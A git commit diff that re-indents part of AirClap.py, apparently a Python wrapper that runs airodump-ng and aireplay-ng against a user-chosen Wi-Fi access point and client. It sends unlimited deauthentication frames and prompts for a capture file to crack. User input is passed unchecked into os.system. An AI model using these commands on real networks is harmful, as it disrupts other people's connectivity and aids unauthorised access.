f819c944ef731b216441be8ea6f7559044b5a36f
Josiah Crofton <44535515+jobro247@users.noreply.github.com>
2018-11-24 10:57:28 -0800

    Update AirClap.py

--- AirClap.py
+++ AirClap.py
@@ -26,9 +26,9 @@ if main_choice == 'c':
     os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (a, t))
     os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
  elif lack == 'y' or 'Y':
- p = raw_input("Enter the bssid of your target!:")
- aireplay_client = raw_input("Enter the client you want to target:")
- os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
+  p = raw_input("Enter the bssid of your target!:")
+  aireplay_client = raw_input("Enter the client you want to target:")
+  os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
 if main_choice == 'd':
   path = raw_input("Enter the path your pcap file:")
   b = raw_input("Enter the bssid of the network your trying to crack:")
